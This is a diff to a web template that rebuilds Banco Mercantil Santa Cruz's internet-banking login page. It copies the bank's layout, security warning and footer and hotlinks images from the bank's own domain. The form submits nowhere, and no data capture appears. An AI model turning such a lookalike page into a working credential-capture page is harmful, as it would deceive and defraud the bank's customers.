@@ -3,78 +3,109 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title><%= title %></title>
+    <title>Banca por Internet</title>
     <link rel="icon" href="/img/favicon.svg" type="image/svg+xml" />
-    <link rel="stylesheet" href="/css/styles.css" />
+    <link rel="stylesheet" href="/css/banca.css" />
   </head>
-  <body class="banca-page">
-    <header class="banca-top">
-      <div class="banca-top-inner">
-        <div class="banca-brand">
-          <img src="<%= ASSETS.footerLogo %>" alt="Mercantil Santa Cruz" />
-        </div>
-        <div class="banca-langs">
-          <a href="#">ayuda</a>
-          <span>|</span>
+  <body>
+    <div id="corporateHeader">
+      <div class="logo" title="Mercantil Santa Cruz"></div>
+      <div class="rightZone">
+        <ul>
+          <li><a href="#">ayuda</a></li>
+        </ul>
+        <div class="langBar">
+          <img src="https://bnet.bmsc.com.bo/BMSC.ICBanking.WebUI/App_Themes/Default/Images/img-flag-eng.png" width="16" height="11" alt="" />
           <a href="#">english</a>
         </div>
       </div>
-    </header>
+    </div>
 
-    <main class="banca-wrap">
-      <section class="banca-card">
-        <div class="banca-card-head">
-          <h1>Bienvenido a la Banca por Internet</h1>
-          <p class="banca-date"><%= todayLabel %></p>
-        </div>
-        <div class="banca-card-body">
-          <div class="banca-form">
-            <form action="#" method="post" autocomplete="off">
-              <label class="banca-user">
-                <span class="user-icon" aria-hidden="true">👤</span>
-                <span>Usuario:</span>
-                <input type="text" name="usuario" placeholder="Ingrese su usuario" autocomplete="off" />
-                <button class="kb-btn" type="button" title="Teclado virtual">⌨</button>
-              </label>
-              <p class="banca-hint">Puede utilizar el teclado virtual para ingresar su nombre de usuario</p>
-              <p class="banca-hint">Ingrese el código que ve en la siguiente imagen:</p>
-              <div class="captcha-box">Captcha</div>
-              <div class="banca-actions">
-                <p>
-                  Puedes consultar el manual de uso y los tutoriales de la Banca por Internet, haciendo click
-                  <a href="#">AQUI</a>
-                </p>
-                <p>&gt; Activación en línea: <a href="#">Persona Natural</a></p>
-                <button class="btn btn-lime banca-enter" type="button">Ingresar</button>
-              </div>
+    <div id="container">
+      <div id="containerTop" class="withoutBreadcrumb">
+        <h3>Bienvenido a la Banca por Internet</h3>
+        <span class="fecha"><%= todayLabel.charAt(0).toUpperCase() + todayLabel.slice(1) %></span>
+      </div>
+
+      <div id="containerMid">
+        <div class="colLeft">
+          <div class="contentLogin">
+            <form action="#" method="post" autocomplete="off" onsubmit="return false;">
+              <ul class="login">
+                <li class="user-row">
+                  <span class="userIcon" aria-hidden="true"></span>
+                  <span class="usuario">Usuario:</span>
+                  <input
+                    id="txtUser"
+                    type="password"
+                    name="usuario"
+                    placeholder="Ingrese su usuario"
+                    autocomplete="off"
+                    spellcheck="false"
+                  />
+                  <button class="btnVirtualKeyboard" type="button" title="Teclado virtual"></button>
+                </li>
+                <li class="show-chars">
+                  <label>
+                    <input type="checkbox" id="cbShowCharacters" />
+                    Ver caracteres
+                  </label>
+                </li>
+                <li class="genericMsg">Puede utilizar el teclado virtual para ingresar su nombre de usuario</li>
+                <li class="help-row">
+                  <p>
+                    Puedes consultar el manual de uso y los tutoriales de la Banca por Internet, haciendo click
+                    <a href="#">AQUI</a>
+                  </p>
+                  <p class="contratar">&gt; Activación en línea: <a href="#">Persona Natural</a></p>
+                  <button class="btnGenericGreen" type="button">Ingresar</button>
+                </li>
+              </ul>
             </form>
           </div>
-          <aside class="banca-ad">
-            <img src="https://bnet.bmsc.com.bo/BMSC.ICBanking.WebUI/App_Themes/Default/Images/banner_120x400.jpg" alt="" width="120" height="400" />
-          </aside>
+
+          <section class="warn-box">
+            <h2><span class="lock" aria-hidden="true"></span> ADVERTENCIA</h2>
+            <p>Estimado cliente,</p>
+            <p>
+              El Banco Mercantil Santa Cruz NO envía a través de correo electrónico ni de otros medios masivos, comunicados de actualización de datos personales, ni solicita información sobre sus cuentas, pins, claves de acceso u otros. Si recibe algún correo con instrucciones de este tipo y/o solicitud de acceso a una página web, NO ingrese sus datos.
+            </p>
+            <p>Tome en cuenta las siguientes recomendaciones de seguridad:</p>
+            <ul>
+              <li>Acceda a nuestra página web únicamente escribiendo la dirección www.bmsc.com.bo en su explorador, nunca a través de enlaces.</li>
+              <li>Si recibe correos electrónicos de origen desconocido con mensajes de cumpleaños, rastrillos, tarjetas virtuales, invitaciones, avisos de impuestos y otros similares ignórelos. No ingrese a esos enlaces y elimínelos ya que pueden contener virus y/o troyanos.</li>
+            </ul>
+          </section>
         </div>
-      </section>
 
-      <section class="banca-card banca-warn">
-        <h2>🔒 ADVERTENCIA</h2>
-        <p>Estimado cliente,</p>
-        <p>El Banco Mercantil Santa Cruz NO envía a través de correo electrónico ni de otros medios masivos, comunicados de actualización de datos personales, ni solicita información sobre sus cuentas, pins, claves de acceso u otros. Si recibe algún correo con instrucciones de este tipo y/o solicitud de acceso a una página web, NO ingrese sus datos.</p>
-        <p>Tome en cuenta las siguientes recomendaciones de seguridad:</p>
-        <ul>
-          <li>Acceda a nuestra página web únicamente escribiendo la dirección www.bmsc.com.bo en su explorador, nunca a través de enlaces.</li>
-          <li>Si recibe correos electrónicos de origen desconocido con mensajes de cumpleaños, rastrillos, tarjetas virtuales, invitaciones, avisos de impuestos y otros similares ignórelos. No ingrese a esos enlaces y elimínelos ya que pueden contener virus y/o troyanos.</li>
-        </ul>
-      </section>
+        <aside class="colRight">
+          <img src="https://bnet.bmsc.com.bo/BMSC.ICBanking.WebUI/App_Themes/Default/Images/banner_120x400.jpg" width="120" height="400" alt="" />
+        </aside>
+      </div>
+      <div id="containerBottom"></div>
+    </div>
 
-      <p class="banca-legal">
+    <div id="corporateFooter">
+      <p>
         Esta entidad se encuentra bajo la regulación y supervisión de la Autoridad de Supervisión del Sistema Financiero (ASFI).<br />
+        La información obtenida por medio de nuestro canal de Banca por Internet, debe estar sujeta a confirmación y validación en las oficinas del Banco. Proteja su información personal, no permita que se exponga a terceros.<br />
         Copyright Banco Mercantil Santa Cruz <%= year %>
       </p>
-    </main>
+      <span class="footer-logo"></span>
+    </div>
 
     <a class="reclamo" href="#" aria-label="Punto de reclamo">
-      <img src="<%= ASSETS.reclamo %>" alt="Punto de reclamo" width="92" height="92" />
+      <img src="https://bnet.bmsc.com.bo/BMSC.ICBanking.WebUI/App_Themes/Default/Images/puntoDeReclamo.png" alt="Punto de Reclamo" width="120" height="120" />
     </a>
     <script src="/js/main.js"></script>
+    <script>
+      const user = document.getElementById("txtUser");
+      const show = document.getElementById("cbShowCharacters");
+      if (user && show) {
+        show.addEventListener("change", () => {
+          user.type = show.checked ? "text" : "password";
+        });
+      }
+    </script>
   </body>
 </html>
